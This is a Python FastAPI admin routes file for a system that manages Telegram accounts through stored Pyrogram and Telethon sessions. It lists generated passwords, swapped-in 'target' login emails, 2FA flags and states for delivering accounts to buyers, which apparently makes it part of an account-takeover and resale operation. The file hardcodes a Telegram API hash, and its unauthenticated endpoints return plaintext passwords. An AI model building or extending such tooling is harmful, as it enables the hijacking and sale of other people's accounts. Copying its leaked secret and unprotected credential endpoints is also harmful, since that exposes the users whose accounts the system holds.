"""
Admin API Routes
Handles: dashboard data, account management, fixes
"""

from datetime import datetime
from typing import Dict, Any
from fastapi import APIRouter, HTTPException

from backend.core_engine.logger import get_logger
from backend.core_engine.pyrogram_client import get_session_manager
from backend.models.database import (
    AuthStatus, DeliveryStatus, TransferMode,
    get_account, update_account, async_session, Account
)
from backend.api.sessions import check_pyrogram_health, check_telethon_health, get_account_emails_live
from sqlalchemy import select

logger = get_logger("AdminAPI")
router = APIRouter(prefix="/admin", tags=["Admin"])

API_ID = 28907635
API_HASH = "fa6c3335de68283781976ae20f813f73"


def get_pyrogram():
    return get_session_manager(API_ID, API_HASH, "sessions")


@router.get("/accounts/all")
async def get_all_accounts():
    """Get all accounts with categorization"""
    async with async_session() as session:
        result = await session.execute(select(Account))
        accounts = result.scalars().all()
        
        ready, pending, delivered, expired = [], [], [], []
        
        for acc in accounts:
            data = {
                "phone": acc.phone,
                "telegram_id": acc.telegram_id,
                "status": acc.status.value if acc.status else "unknown",
                "transfer_mode": acc.transfer_mode.value if acc.transfer_mode else "bot_only",
                "password": acc.generated_password,
                "target_email": acc.target_email,
                "email_hash": acc.email_hash,
                "email_changed": acc.email_changed or False,
                "has_2fa": acc.has_2fa or False,
                "audit_passed": acc.audit_passed or False,
                "has_pyrogram_session": acc.pyrogram_session is not None,
                "has_telethon_session": acc.telethon_session is not None,
                "delivery_status": acc.delivery_status.value if acc.delivery_status else None,
                "delivery_count": acc.delivery_count or 0,
                "created_at": acc.created_at.isoformat() if acc.created_at else None,
                "completed_at": acc.completed_at.isoformat() if acc.completed_at else None
            }
            
            if acc.status and acc.status.value == "expired":
                expired.append(data)
            elif acc.delivery_status and acc.delivery_status.value in ["delivered", "buyer_delivered"]:
                delivered.append(data)
            elif acc.status and acc.status.value == "completed" and acc.generated_password:
                ready.append(data)
            elif acc.pyrogram_session and acc.generated_password:
                ready.append(data)
            else:
                pending.append(data)
        
        return {
            "status": "success",
            "summary": {
                "total": len(accounts),
                "ready": len(ready),
                "pending": len(pending),
                "delivered": len(delivered),
                "expired": len(expired)
            },
            "ready_accounts": ready,
            "pending_accounts": pending,
            "delivered_accounts": delivered,
            "expired_accounts": expired
        }


@router.get("/account/{account_id}")
async def get_account_details(account_id: str):
    """Get account details with live session check and emails"""
    phone = account_id
    account = await get_account(phone)
    
    if not account:
        raise HTTPException(status_code=404, detail="Account not found")
    
    pyrogram = await check_pyrogram_health(phone)
    telethon = await check_telethon_health(phone)
    emails = await get_account_emails_live(phone)
    
    return {
        "status": "success",
        "account": {
            "phone": account.phone,
            "telegram_id": account.telegram_id,
            "status": account.status.value if account.status else "unknown",
            "transfer_mode": account.transfer_mode.value if account.transfer_mode else "bot_only",
            "password": account.generated_password,
            "target_email": account.target_email,
            "email_hash": account.email_hash,
            "has_2fa": emails.get("has_2fa", False),
            "audit_passed": account.audit_passed or False,
            "has_pyrogram_session": account.pyrogram_session is not None,
            "has_telethon_session": account.telethon_session is not None,
            "pyrogram_status": "active" if pyrogram["active"] else "inactive",
            "telethon_status": "active" if telethon["active"] else "inactive",
            "session_status": "active" if pyrogram["active"] and telethon["active"] else "inactive",
            "login_email": emails.get("login_email"),
            "login_email_status": emails.get("login_email_status"),
            "pending_email": emails.get("pending_email"),
            "has_recovery_email": emails.get("has_recovery_email"),
            "is_our_email": emails.get("is_our_login_email", False),
            "sessions_count": emails.get("sessions_count", 0),
            "delivery_status": account.delivery_status.value if account.delivery_status else None,
            "delivery_count": account.delivery_count or 0,
            "created_at": account.created_at.isoformat() if account.created_at else None,
            "completed_at": account.completed_at.isoformat() if account.completed_at else None
        }
    }


@router.post("/account/{account_id}/fix")
async def fix_account(account_id: str, request: dict = None):
    """Fix account data manually"""
    phone = account_id
    
    async with async_session() as session:
        result = await session.execute(select(Account).where(Account.phone == phone))
        account = result.scalar_one_or_none()
        
        if not account:
            raise HTTPException(status_code=404, detail="Account not found")
        
        updates = {}
        
        if request:
            if request.get("reset_delivery_count"):
                updates["delivery_count"] = 0
                updates["delivered_at"] = None
            
            if "set_status" in request:
                status_map = {
                    "completed": AuthStatus.COMPLETED,
                    "authenticated": AuthStatus.AUTHENTICATED,
                    "pending_code": AuthStatus.PENDING_CODE,
                    "audit_passed": AuthStatus.AUDIT_PASSED
                }
                if request["set_status"] in status_map:
                    updates["status"] = status_map[request["set_status"]]
            
            if "set_delivery_status" in request:
                ds_map = {
                    "bot_received": DeliveryStatus.BOT_RECEIVED,
                    "ready": DeliveryStatus.READY,
                    "buyer_delivered": DeliveryStatus.BUYER_DELIVERED
                }
                if request["set_delivery_status"] in ds_map:
                    updates["delivery_status"] = ds_map[request["set_delivery_status"]]
            
            if "set_has_2fa" in request:
                updates["has_2fa"] = request["set_has_2fa"]
            
            if "set_audit_passed" in request:
                updates["audit_passed"] = request["set_audit_passed"]
        
        if updates:
            for key, value in updates.items():
                setattr(account, key, value)
            await session.commit()
        
        return {
            "status": "success",
            "message": f"Account {phone} updated",
            "updates": {k: str(v) for k, v in updates.items()}
        }


@router.get("/account/{account_id}/raw")
async def get_account_raw(account_id: str):
    """Get raw account data from database"""
    phone = account_id
    
    async with async_session() as session:
        result = await session.execute(select(Account).where(Account.phone == phone))
        account = result.scalar_one_or_none()
        
        if not account:
            raise HTTPException(status_code=404, detail="Account not found")
        
        return {
            "status": "success",
            "raw_data": {
                "phone": account.phone,
                "telegram_id": account.telegram_id,
                "first_name": account.first_name,
                "status": account.status.value if account.status else None,
                "pyrogram_session": "EXISTS" if account.pyrogram_session else None,
                "pyrogram_session_length": len(account.pyrogram_session) if account.pyrogram_session else 0,
                "telethon_session": "EXISTS" if account.telethon_session else None,
                "has_2fa": account.has_2fa,
                "has_recovery_email": account.has_recovery_email,
                "other_sessions_count": account.other_sessions_count,
                "generated_password": account.generated_password,
                "delivery_status": account.delivery_status.value if account.delivery_status else None,
                "transfer_mode": account.transfer_mode.value if account.transfer_mode else None,
                "email_hash": account.email_hash,
                "target_email": account.target_email,
                "email_changed": account.email_changed,
                "email_verified": account.email_verified,
                "delivery_count": account.delivery_count,
                "pyrogram_healthy": account.pyrogram_healthy,
                "telethon_healthy": account.telethon_healthy,
                "audit_passed": account.audit_passed,
                "created_at": account.created_at.isoformat() if account.created_at else None,
                "completed_at": account.completed_at.isoformat() if account.completed_at else None
            }
        }
